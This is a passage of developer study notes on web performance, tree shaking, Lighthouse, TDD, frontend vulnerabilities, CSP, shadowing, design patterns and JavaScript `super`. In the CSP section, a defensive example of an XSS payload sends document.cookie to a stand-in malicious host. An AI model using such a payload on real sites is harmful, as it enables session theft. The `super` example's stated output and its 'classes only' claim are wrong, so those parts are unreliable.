- **Content Delivery Network (CDN):**
  - Use a CDN to cache static resources and reduce latency for users in distant regions.

---

### 4. **Hosting Environment**
- **Server Configuration:**
  - Ensure the server is configured optimally (e.g., proper PHP/Node.js settings, caching mechanisms).
  - Use caching systems like **Redis**, **Memcached**, or HTTP caching.
- **Scalability:**
  - Ensure the hosting environment supports the current traffic load.
  - Use load balancers if experiencing high traffic.

---

### 5. **Analyze Time-to-First-Byte (TTFB)**
- Test TTFB to determine server responsiveness.
- Tools: **WebPageTest**, **DevTools**, or **cURL**.

---

### 6. **Test on Multiple Devices**
- Test performance on both desktop and mobile devices. Mobile users may face slower performance due to weaker hardware or network limitations.

---

### 7. **Common Tools for Diagnosis**
- **Google PageSpeed Insights**
- **GTmetrix**
- **Pingdom**
- **WebPageTest**
- **Chrome DevTools**

---

### 8. **Iterative Testing**
- Make one change at a time and test performance to ensure the change has the desired effect.

---

If you're already familiar with **JavaScript**, focus on optimizing client-side JavaScript, identifying unnecessary libraries, and reducing execution time.


## Tree Shaking
**Tree shaking** is a technique used in JavaScript (and other modern programming languages) to optimize code by eliminating unused parts of the codebase during the build process. It gets its name from the idea of "shaking" a tree to drop the dead leaves (unused code).

This is especially useful in large applications or when using libraries like Lodash or utility functions where only a subset of the code is needed.

---

### How Tree Shaking Works

Tree shaking relies on **static analysis** of the import/export statements in ES Modules (ESM). Since ES Modules are **statically analyzable** (their structure is fixed and predictable), tools like Webpack, Rollup, or Vite can determine which parts of the code are actually used and remove the rest.

#### Key Requirements:
1. **ES Modules (ESM)**: Must use `import`/`export` syntax instead of CommonJS (`require`/`module.exports`).
2. **Side-effect-free Code**: Your code or library must not have side effects during execution for unused imports to be safely removed.

---

### Example:

#### Without Tree Shaking:
```javascript
// utils.js
export const add = (a, b) => a + b;
export const subtract = (a, b) => a - b;

// main.js
import { add } from './utils.js';

console.log(add(2, 3));
```

Even though **`subtract`** is never used, it might still be included in the final bundle if tree shaking isn't applied.

#### With Tree Shaking:
A build tool will detect that **`subtract`** is unused and exclude it from the final bundle, reducing file size.

---

### Configuring Tree Shaking in Tools:

1. **Webpack**:
   - Ensure you're using the **production mode**, as tree shaking is automatically enabled in production builds.
   - Include `sideEffects: false` in `package.json` for files that have no side effects.

   ```json
   {
     "sideEffects": false
   }
   ```

2. **Rollup**:
   - Rollup has built-in tree-shaking support. Ensure you're using ES modules and avoid using CommonJS.

3. **Vite**:
   - Vite uses Rollup under the hood, so tree shaking is supported automatically.

---

### Libraries and Tree Shaking

Not all libraries are tree-shakable by default. For instance:
- If a library is written in CommonJS, tools may struggle to tree-shake it.
- Side effects in module initialization can prevent proper tree shaking.

---

### Benefits of Tree Shaking:
1. **Smaller Bundle Sizes**: Reduces the final bundle size by removing unused code.
2. **Improved Performance**: Faster load times for web applications.
3. **Cleaner Code**: Encourages modular and efficient coding practices.

---

## Mutable vs Immutable
In JavaScript, **mutable** and **immutable** refer to whether a value or data structure can be changed after it is created.

### 1. **Mutable**
Mutable values can be changed directly. Operations on these values modify the original value.

#### Examples of mutable types:
- **Objects**: 
    ```javascript
    const obj = { a: 1 };
    obj.a = 2; // The object is modified.
    console.log(obj); // { a: 2 }
    ```
- **Arrays**:
    ```javascript
    const arr = [1, 2, 3];
    arr.push(4); // The array is modified.
    console.log(arr); // [1, 2, 3, 4]
    ```

#### Key Characteristics:
- Changes to mutable data are made in place.
- References to the same object/array will see the updated value.

---

### 2. **Immutable**
Immutable values cannot be changed once created. Any modification results in the creation of a new value or object.

#### Examples of immutable types:
- **Primitive values**:
    - Strings
    - Numbers
    - Booleans
    - `null`
    - `undefined`
    - Symbols
    ```javascript
    let str = "Hello";
    let newStr = str.toUpperCase(); // Creates a new string.
    console.log(str); // "Hello" (unchanged)
    console.log(newStr); // "HELLO"
    ```

- Libraries like **Immutable.js** can make objects and arrays immutable:
    ```javascript
    const { Map } = require('immutable');
    const map = Map({ a: 1 });
    const newMap = map.set('a', 2);
    console.log(map.get('a')); // 1
    console.log(newMap.get('a')); // 2
    ```

#### Key Characteristics:
- Original data remains unaltered.
- Changes produce new data, leaving the original intact.
- Useful in functional programming and applications where immutability aids in debugging and state management (e.g., React's state).

---

### Mutable vs. Immutable: Key Differences
| Aspect                 | Mutable                     | Immutable                  |
|------------------------|-----------------------------|----------------------------|
| **Modification**       | Directly changes data       | Creates a new value/object |
| **Examples**           | Arrays, Objects            | Strings, Numbers, Booleans |
| **Performance**        | Efficient for in-place changes | Less efficient (creates new copies) |
| **Side Effects**       | Can lead to unexpected changes in shared references | Helps avoid side effects in shared references |
| **Use Cases**          | Localized, performance-critical changes | Functional programming, state management |

Understanding when to use mutable vs. immutable values is essential for writing clean, predictable, and efficient JavaScript code.


## Lighthouse
Google Chrome's Lighthouse tool provides audits across several categories to assess the quality and performance of a web application. Here's an overview of what Lighthouse detects in its reports:

### 1. **Performance**
   - **Page Load Speed**: Measures how quickly the page loads and becomes interactive.
   - **Largest Contentful Paint (LCP)**: Time taken for the largest visible content element to load.
   - **First Contentful Paint (FCP)**: Time to render the first piece of content on the page.
   - **Time to Interactive (TTI)**: Time until the page is fully interactive.
   - **Cumulative Layout Shift (CLS)**: Measures visual stability by detecting layout shifts during loading.
   - **Speed Index**: Indicates how quickly content is visually displayed.
   - **Unused JavaScript/CSS**: Detects unnecessary resources being loaded.
   - **Render-blocking Resources**: Identifies scripts and styles that delay rendering.

### 2. **Accessibility**
   - **Color Contrast**: Checks if text is readable against background colors.
   - **ARIA Attributes**: Validates the usage of ARIA roles, properties, and states.
   - **Keyboard Accessibility**: Ensures all interactive elements are usable via keyboard.
   - **Labels and Alt Text**: Verifies the presence of labels for inputs and alt attributes for images.
   - **Tab Order**: Ensures logical tab navigation.

### 3. **Best Practices**
   - **HTTPS Usage**: Checks if the site uses HTTPS.
   - **Safe Links**: Ensures links open securely (e.g., `noopener` for external links).
   - **Avoids Vulnerable Libraries**: Flags use of outdated or insecure third-party libraries.
   - **Image Aspect Ratios**: Verifies images have correct aspect ratios to prevent distortion.
   - **Error Handling**: Detects issues with browser errors, like console logs or 404s.

### 4. **SEO**
   - **Metadata**: Checks for meta tags like `title` and `meta description`.
   - **Viewport Settings**: Validates mobile-friendly configurations (e.g., responsive design).
   - **Structured Data**: Examines structured data compliance (JSON-LD, Microdata).
   - **Crawlability**: Checks if the page is indexable by search engines.
   - **HTTP Status Codes**: Validates proper server responses like `200 OK`.

### 5. **Progressive Web App (PWA)**
   - **Installability**: Checks if the site meets PWA installability criteria.
   - **Service Worker**: Verifies if a service worker is registered and functioning.
   - **Offline Support**: Confirms the app works offline or with poor connectivity.
   - **Manifest File**: Checks if the web app manifest is valid and complete.
   - **HTTPS Requirement**: Validates secure connection (mandatory for PWA).

### 6. **Other Insights**
   - **Custom Audits**: Developers can include their own audits via plugins.
   - **Diagnostics**: Provides detailed breakdowns of bottlenecks (e.g., main-thread work, JavaScript execution).

Lighthouse produces a detailed, actionable report with scores for each category, making it a powerful tool for developers to improve their site's performance, accessibility, and user experience.


## TDD
### **Test-Driven Development (TDD)**

**Test-Driven Development (TDD)** is a software development methodology where tests are written before the actual implementation code. The primary goal of TDD is to ensure that the software behaves as expected by verifying its functionality through automated tests from the outset.

---

### **Core Concepts of TDD**
1. **Write Tests First**:
   - Start by writing a test that defines how a particular piece of functionality should behave.
   - The test will initially fail because the functionality hasn’t been implemented yet.

2. **Make the Test Pass**:
   - Write the minimal amount of code necessary to make the test pass.
   - Focus only on satisfying the test, avoiding extra functionality.

3. **Refactor the Code**:
   - Clean up and optimize the implementation while ensuring the test still passes.
   - Improve code quality without altering functionality.

---

### **TDD Cycle (The "Red-Green-Refactor" Cycle)**
1. **Red**: Write a failing test.
   - The test should fail initially because the feature doesn't exist yet.
   - This ensures that the test is valid and not falsely passing.

2. **Green**: Write code to make the test pass.
   - Implement just enough functionality to satisfy the test.
   - Avoid over-engineering or adding unnecessary features.

3. **Refactor**: Optimize the code.
   - Improve the code's structure, readability, or efficiency.
   - Ensure all tests still pass after refactoring.

---

### **Benefits of TDD**
1. **Higher Code Quality**:
   - Writing tests first ensures that the code meets the defined requirements and behaves as expected.

2. **Fewer Bugs**:
   - Tests catch regressions and ensure new changes don’t break existing functionality.

3. **Faster Debugging**:
   - When a test fails, it pinpoints the issue, making debugging easier.

4. **Encourages Simplicity**:
   - Developers write only the necessary code to pass the test, avoiding overcomplication.

5. **Improved Confidence**:
   - With comprehensive tests, developers can refactor or extend the codebase with confidence.

---

### **Example of TDD in Action**

#### Step 1: Write a Test (Red)
Write a test for a function `add(a, b)` that should return the sum of `a` and `b`.

```javascript
test('adds two numbers', () => {
  expect(add(1, 2)).toBe(3); // Test will fail since `add` is not implemented.
});
```

#### Step 2: Implement the Code (Green)
Write the minimal code to make the test pass.

```javascript
function add(a, b) {
  return a + b;
}
```

Run the test, and it should pass.

#### Step 3: Refactor the Code
Since the function is simple, no refactoring is needed in this case. For more complex scenarios, this is where you optimize or clean up your code.

---

### **Challenges of TDD**
1. **Learning Curve**:
   - Developers new to TDD may find it hard to write tests first and think in terms of test cases.

2. **Initial Time Investment**:
   - Writing tests first may feel slower initially, but it saves time in the long run.

3. **Overhead for Simple Tasks**:
   - For trivial functionalities, TDD can feel like overkill.

---

### **Conclusion**
TDD is a disciplined development practice that ensures functionality is well-tested and code is clean. It fosters better design decisions and helps avoid introducing bugs, especially in complex applications. By adopting TDD, developers write robust, maintainable, and reliable software.


## Vulnerabilities in Frontend
Front-end vulnerabilities in web pages can arise from improper input handling, insecure code, or misconfigurations. Below are some common vulnerabilities:

### 1. **Cross-Site Scripting (XSS)**
   - **Description**: Malicious scripts injected into the web page, often through input fields or query parameters.
   - **Impact**: Can steal user data (e.g., cookies), perform unauthorized actions on behalf of the user, or display malicious content.
   - **Prevention**: 
     - Use proper input sanitization and output escaping.
     - Use a Content Security Policy (CSP).

---

### 2. **Insecure Direct Object References (IDOR)**
   - **Description**: Exposing internal objects like database IDs, which can be manipulated to access unauthorized data.
   - **Impact**: Data leaks and privilege escalation.
   - **Prevention**: 
     - Use access control checks.
     - Avoid exposing sensitive identifiers.

---

### 3. **Cross-Origin Resource Sharing (CORS) Misconfigurations**
   - **Description**: Misconfigured CORS policies allowing untrusted origins to access sensitive data.
   - **Impact**: Unauthorized access to user data.
   - **Prevention**: 
     - Restrict allowed origins in CORS headers.
     - Avoid using `*` for allowed origins.

---

### 4. **DOM-Based XSS**
   - **Description**: Manipulation of the DOM in the browser using unsafe JavaScript methods like `innerHTML`, `eval`, or `document.write`.
   - **Impact**: Similar to XSS, affecting users directly in their browsers.
   - **Prevention**:
     - Avoid unsafe DOM manipulation.
     - Use libraries like DOMPurify.

---

### 5. **Sensitive Data Exposure**
   - **Description**: Exposing sensitive information in the front-end, such as API keys or user credentials.
   - **Impact**: Data theft and misuse.
   - **Prevention**:
     - Store sensitive data securely on the server side.
     - Use environment variables for keys in development.

---

### 6. **Unrestricted File Uploads**
   - **Description**: Allowing users to upload files without proper validation.
   - **Impact**: May lead to XSS, malware distribution, or server-side attacks.
   - **Prevention**:
     - Validate file type, size, and content.
     - Use secure upload directories.

---

### 7. **Improper Error Handling**
   - **Description**: Exposing detailed error messages to the user.
   - **Impact**: Reveals stack traces, API details, or sensitive logic.
   - **Prevention**:
     - Display generic error messages to users.
     - Log detailed errors server-side.

---

### 8. **Clickjacking**
   - **Description**: Tricking users into clicking hidden buttons or links via an iframe.
   - **Impact**: Unintended actions, such as transferring money or leaking information.
   - **Prevention**:
     - Use `X-Frame-Options` header or `Content-Security-Policy: frame-ancestors`.

---

### 9. **Client-Side Injection**
   - **Description**: Injection of malicious data into client-side scripts, such as SQL or NoSQL queries in JavaScript.
   - **Impact**: Data leaks or unexpected application behavior.
   - **Prevention**:
     - Validate and sanitize inputs.
     - Avoid dynamic queries on the front end.

---

### 10. **Insecure Dependencies**
   - **Description**: Using outdated or vulnerable third-party libraries or frameworks.
   - **Impact**: Attackers exploit vulnerabilities in dependencies to compromise the application.
   - **Prevention**:
     - Regularly update dependencies.
     - Use tools like npm audit or Snyk to monitor vulnerabilities.

---

### 11. **Cross-Site Request Forgery (CSRF)**
   - **Description**: Exploiting authenticated sessions to perform unintended actions.
   - **Impact**: Unintended actions performed by authenticated users.
   - **Prevention**:
     - Use CSRF tokens.
     - Implement same-site cookies.

---

### 12. **Overexposed APIs**
   - **Description**: Exposing APIs with excessive permissions or inadequate authentication.
   - **Impact**: Unauthorized data access or actions.
   - **Prevention**:
     - Use authentication and rate-limiting.
     - Apply least privilege principles.

By addressing these vulnerabilities through secure coding practices, user input validation, and proper configurations, the risk of exploitation can be significantly minimized.


## Content Security Policy
The **Content Security Policy (CSP)** is a security feature that helps protect your website against various types of attacks, such as cross-site scripting (XSS) and data injection. You can define a CSP in an HTML document using the `<meta>` tag or by configuring HTTP response headers on your server.

### Example: Adding CSP to an HTML Document
Here’s how you can add a basic CSP using the `<meta>` tag:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self';">
    <title>Content Security Policy Example</title>
</head>
<body>
    <h1>Hello, World!</h1>
    <script>
        console.log('This is allowed.');
    </script>
</body>
</html>
```

### Explanation of Directives
1. **`default-src`**: The default policy for loading resources (scripts, styles, images, etc.).
2. **`script-src`**: Specifies valid sources for JavaScript.
3. **`style-src`**: Specifies valid sources for CSS stylesheets.
4. **`img-src`**: Specifies valid sources for images (e.g., `data:` allows inline base64-encoded images).
5. **`connect-src`**: Specifies valid sources for HTTP requests (e.g., AJAX, WebSockets).

### Best Practices
1. **Use Nonce or Hash**: For inline scripts or styles, use nonces or hashes to allow specific inline code without enabling all inline code (`unsafe-inline` should be avoided):
   ```html
   <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-randomValue';">
   <script nonce="randomValue">
       console.log('This is allowed.');
   </script>
   ```

2. **Avoid `unsafe-inline` or `unsafe-eval`**: These weaken your CSP and should only be used when absolutely necessary.

3. **Define Policy in HTTP Headers**: Configuring CSP in server headers is preferable to the `<meta>` tag because it prevents tampering with the policy in client-side code:
   - Example (Apache):
     ```apache
     Header set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self';"
     ```
   - Example (Nginx):
     ```nginx
     add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self';";
     ```

A **Content Security Policy (CSP)** acts as a safeguard that tells the browser which resources (scripts, styles, images, etc.) are allowed to load and execute on your website. By restricting resource loading to trusted sources, CSP helps to prevent attacks like:

### 1. **Cross-Site Scripting (XSS)**
   CSP blocks malicious scripts injected into your site, either by attackers or compromised third-party services. For example:
   - If an attacker injects `<script>alert('Hacked!')</script>`, CSP prevents it from running unless the script's source is explicitly allowed.

### 2. **Data Injection Attacks**
   CSP limits attackers' ability to inject content that could manipulate your site or steal data.

### 3. **Mitigates Clickjacking**
   CSP can control whether your site can be embedded into an iframe on other sites using the `frame-ancestors` directive.

---

### Key Benefits
1. **Restricts Sources**:
   - For example, you can allow scripts only from your domain (`'self'`), ensuring third-party or malicious scripts are blocked.
   
2. **Protects Against Inline Scripts**:
   - By default, CSP blocks inline `<script>` tags and `style` attributes unless explicitly allowed.

3. **Improves Security of External Resources**:
   - Ensures only whitelisted external resources (e.g., CDN) are loaded.

---

### Example Scenario
Suppose your website includes a search box. Without CSP, an attacker might inject malicious code into the search query URL, like:
```html
<script>document.location='http://malicious-site.com?cookies='+document.cookie</script>
```

If CSP is configured, the browser blocks this malicious script because the source isn't allowed in the policy.

---

### Debugging and Reporting
You can use the `report-uri` or `report-to` directive in CSP to collect violation reports, helping you refine your policy:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; report-uri /csp-report;">
```

When a violation occurs, the browser sends a report to `/csp-report`, allowing you to identify and fix potential issues.

---

CSP doesn't stop **all attacks**, but it significantly strengthens your website’s defenses. Would you like to explore configuring CSP for a specific type of site or framework?



## Variable Shadowing
Variable shadowing in JavaScript occurs when a variable in a local scope (e.g., inside a function or block) has the same name as a variable in an outer scope. The inner variable "shadows" the outer variable, meaning the inner variable takes precedence and is used within its scope.

Here's an example:

```javascript
let x = 10; // Outer variable

function example() {
  let x = 20; // Shadows the outer variable
  console.log(x); // Logs 20
}

example();
console.log(x); // Logs 10 (the outer variable remains unaffected)
```

## Key Points about Shadowing:
1. **Scoping Rules**:
   - Variables defined with `let` or `const` have block scope, so shadowing is limited to the block in which the variable is declared.
   - Variables defined with `var` have function scope, meaning shadowing occurs at the function level.

2. **Global vs. Local Scope**:
   If a global variable is shadowed by a local variable with the same name, the global variable remains unaffected outside the local scope.

   ```javascript
   var globalVar = "global";

   function shadowExample() {
     var globalVar = "local";
     console.log(globalVar); // Logs "local"
   }

   shadowExample();
   console.log(globalVar); // Logs "global"
   ```

3. **Block Scope Example**:
   With `let` and `const`, shadowing can occur at a block level (e.g., within an `if` statement or a loop).

   ```javascript
   let num = 100;

   if (true) {
     let num = 200; // Shadows the outer `num`
     console.log(num); // Logs 200
   }

   console.log(num); // Logs 100
   ```

4. **Avoid Unintended Shadowing**:
   Shadowing can lead to confusion or bugs if not handled carefully. Always use descriptive variable names to minimize the risk of accidental shadowing.

5. **`this` Context and Shadowing**:
   Shadowing can also occur with `this`, especially in nested functions or arrow functions.

   ```javascript
   const obj = {
     value: 42,
     log: function () {
       const value = 100; // Shadows `obj.value`
       console.log(value); // Logs 100
     },
   };

   obj.log();
   ```


## Design Patterns
- [patterns.dev](https://www.patterns.dev/)
- Design patterns in JavaScript are like reusable blueprints for solving common problems in code. They help make your code cleaner, more organized, and easier to maintain. Let’s break it down simply:

### **What are Design Patterns?**
Think of design patterns as templates for how to structure or solve a programming problem. They’re not exact code but rather guiding principles.

### **Why Use Them?**
- **Readability:** Makes your code easier to understand.
- **Reusability:** Write once, use everywhere.
- **Maintenance:** Fixing or extending code becomes simpler.
- **Collaboration:** Helps teams follow common coding practices.

### **Common JavaScript Design Patterns**
Here are a few popular ones explained simply:

#### 1. **Singleton Pattern**
- **Purpose:** Ensures there’s only **one instance** of an object throughout your app.
- **Use Case:** Managing app configuration or a single database connection.
  
```javascript
class Singleton {
  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    Singleton.instance = this;

    // Your initialization code
    this.data = "Singleton Instance";
  }

  getData() {
    return this.data;
  }
}

// Usage
const instance1 = new Singleton();
const instance2 = new Singleton();

console.log(instance1 === instance2); // true

```

---

#### 2. **Factory Pattern**
- **Purpose:** Creates objects without specifying their exact class.
- **Use Case:** When you need different types of objects but don’t want to hardcode the creation logic.

```javascript
class Car {
  constructor() {
    this.type = "Car";
  }
}

class Bike {
  constructor() {
    this.type = "Bike";
  }
}

function VehicleFactory(vehicleType) {
  if (vehicleType === "Car") return new Car();
  if (vehicleType === "Bike") return new Bike();
}

const vehicle1 = VehicleFactory("Car");
const vehicle2 = VehicleFactory("Bike");

console.log(vehicle1.type); // Car
console.log(vehicle2.type); // Bike
```

---

#### 3. **Observer Pattern**
- **Purpose:** Allows one object (subscriber) to listen and react to changes in another object (publisher).
- **Use Case:** Handling events like a user clicking a button.

```javascript
class Subject {
  constructor() {
    this.observers = [];
  }

  subscribe(observer) {
    this.observers.push(observer);
  }

  unsubscribe(observer) {
    this.observers = this.observers.filter((obs) => obs !== observer);
  }

  notify(data) {
    this.observers.forEach((observer) => observer(data));
  }
}

const subject = new Subject();

function logger(data) {
  console.log(`Logger: ${data}`);
}

subject.subscribe(logger);
subject.notify("Event 1"); // Logger: Event 1
subject.notify("Event 2"); // Logger: Event 2
```

---

#### 4. **Module Pattern**
- **Purpose:** Encapsulates code into a single object to prevent variable pollution in the global scope.
- **Use Case:** Creating a library or utility functions.

```javascript
const myModule = (function () {
  const privateVariable = "Hello";

  function privateMethod() {
    console.log("Accessed private method!");
  }

  return {
    publicMethod: function () {
      console.log(privateVariable);
      privateMethod();
    },
  };
})();

myModule.publicMethod(); // Hello, Accessed private method!
```

---

#### 5. **Decorator Pattern**
- **Purpose:** Dynamically adds behaviors or responsibilities to an object.
- **Use Case:** Adding features to objects without altering their structure.

```javascript
function Coffee() {
  this.cost = function () {
    return 5;
  };
}

function MilkDecorator(coffee) {
  const cost = coffee.cost();
  coffee.cost = function () {
    return cost + 2;
  };
}

const myCoffee = new Coffee();
MilkDecorator(myCoffee);

console.log(myCoffee.cost()); // 7
```

---

### **How to Start Using Them?**
1. Identify the problem or scenario in your project.
2. Match it with a design pattern.
3. Implement the pattern to see how it improves your code.



## super in JavaScript
The `super` keyword in JavaScript is used to access and call methods from a parent class. It is primarily used in the context of **class inheritance** to refer to the parent class's methods or constructor. Here's a breakdown of its purposes:

---

### 1. **Calling the Parent Class Constructor**
When a class extends another, the child class must call the parent class's constructor using `super()` before accessing `this`. This ensures that the parent class is properly initialized.

#### Example:
```javascript
class Parent {
    constructor(name) {
        this.name = name;
    }
}

class Child extends Parent {
    constructor(name, age) {
        super(name); // Calls the parent class constructor
        this.age = age;
    }
}

const child = new Child("Alice", 10);
console.log(child.name); // "Alice"
console.log(child.age);  // 10
```

Here, `super(name)` calls the constructor of the `Parent` class to initialize the `name` property.

---

### 2. **Calling a Parent Class Method**
You can also use `super` to call methods in the parent class from a method in the child class.

#### Example:
```javascript
class Parent {
    greet() {
        return "Hello from Parent";
    }
}

class Child extends Parent {
    greet() {
        return `${super.greet()} and Child`;
    }
}

const child = new Child();
console.log(child.greet()); // "Hello from Parent and Child"
```

Here, `super.greet()` calls the `greet` method of the `Parent` class.

---

### 3. **Accessing Parent Class Properties or Methods**
If a parent class has properties or methods that the child class overrides, `super` can still be used to access the original implementation.

#### Example:
```javascript
class Parent {
    constructor() {
        this.role = "Parent";
    }

    describe() {
        return `Role: ${this.role}`;
    }
}

class Child extends Parent {
    constructor() {
        super();
        this.role = "Child"; // Override the role property
    }

    describe() {
        return `${super.describe()} and now Child`;
    }
}

const child = new Child();
console.log(child.describe()); // "Role: Parent and now Child"
```

---

### Key Points:
1. **Must Use in Constructor Before `this`**:
   - In a derived class, you cannot access `this` before calling `super()`. This is because `super()` sets up the `this` context in the child class.

2. **Can Be Used Only in Classes**:
   - `super` is valid only within classes and class constructors, not in standalone functions or objects.

3. **Dynamic Behavior**:
   - If the parent class's method changes, the behavior of `super` dynamically reflects that.



